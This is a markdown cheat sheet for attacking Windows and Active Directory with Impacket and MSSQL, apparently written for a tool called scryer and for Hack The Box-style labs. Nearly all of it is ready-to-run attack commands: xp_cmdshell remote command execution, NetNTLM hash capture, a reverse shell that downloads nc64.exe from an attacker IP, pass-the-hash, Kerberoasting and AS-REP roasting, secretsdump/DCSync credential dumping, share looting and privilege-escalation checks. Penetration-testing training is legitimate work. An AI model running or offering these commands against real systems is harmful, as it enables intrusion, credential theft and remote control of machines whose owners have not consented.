# Impacket + MSSQL cheat sheet

The Impacket suite is the backbone of Windows/AD exploitation from Linux. scryer
prints ready commands from these when it recovers a Windows credential; this is
the reference.

Install: `pipx install impacket` (or `apt install python3-impacket`). Scripts
are `impacket-<name>` or `<name>.py`.

## MSSQL (HTB Archetype path)
```bash
# Connect (SQL auth vs Windows auth)
impacket-mssqlclient DOMAIN/user:'pass'@10.10.10.10 -windows-auth
impacket-mssqlclient sa:'pass'@10.10.10.10                    # SQL login

# Am I sysadmin?  -> 1 = yes
SELECT is_srvrolemember('sysadmin');

# Enable + use xp_cmdshell (RCE) — needs sysadmin
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# From the mssqlclient prompt these shortcuts exist:
enable_xp_cmdshell
xp_cmdshell whoami
```
```sql
-- Grab the flag straight away:
EXEC xp_cmdshell 'powershell -c "Get-ChildItem C:\Users\ -Recurse -Include user.txt,root.txt -EA 0 | Get-Content"';
-- Capture a NetNTLM hash (relay/crack): point it at your responder
EXEC master..xp_dirtree '\\10.10.14.5\share';
```
Reverse shell via xp_cmdshell (stage nc64.exe):
```
# attacker: python3 -m http.server 80 ; nc -lvnp 443
xp_cmdshell "powershell -c cd C:\Users\Public; wget http://10.10.14.5/nc64.exe -outfile nc64.exe; .\nc64.exe -e cmd.exe 10.10.14.5 443"
```

## Getting a shell with creds
```bash
impacket-psexec  DOMAIN/user:'pass'@10.10.10.10     # SYSTEM (needs admin); noisy
impacket-wmiexec DOMAIN/user:'pass'@10.10.10.10     # quieter, semi-interactive
impacket-smbexec DOMAIN/user:'pass'@10.10.10.10
impacket-atexec  DOMAIN/user:'pass'@10.10.10.10 'whoami'
evil-winrm -i 10.10.10.10 -u user -p 'pass'         # if 5985 open
# pass-the-hash (no password):
impacket-psexec -hashes :<nthash> administrator@10.10.10.10
```

## SMB / shares
```bash
smbclient -N -L \\\\10.10.10.10\\               # list shares (null session)
smbclient -N \\\\10.10.10.10\\backups           # browse; get <file>, recurse ON; mget *
netexec smb 10.10.10.10 -u '' -p '' --shares
netexec smb 10.10.10.10 -u user -p 'pass' --shares -M spider_plus
# scryer auto-downloads readable shares into scryer_loot/ and scans them for
# creds (prod.dtsConfig, web.config, ...) + flags.
```

## AD credential attacks (with any creds)
```bash
impacket-GetNPUsers  DOMAIN/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10   # AS-REP roast
impacket-GetUserSPNs DOMAIN/user:'pass' -dc-ip 10.10.10.10 -request              # Kerberoast
impacket-secretsdump DOMAIN/user:'pass'@10.10.10.10                              # dump SAM/LSA
impacket-secretsdump -just-dc DOMAIN/user:'pass'@10.10.10.10                     # DCSync (needs rights)
impacket-getTGT DOMAIN/user:'pass'                                               # -> .ccache; export KRB5CCNAME
```
Crack roast output: `hashcat -m 18200` (AS-REP) / `-m 13100` (Kerberoast).

## Windows privesc quick hits (after a shell)
```powershell
whoami /priv                     # SeImpersonate -> PrintSpoofer/GodPotato -> SYSTEM
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt   # creds!
cmdkey /list ; reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
See `windows-privesc.md` and `active-directory.md` for the full trees.
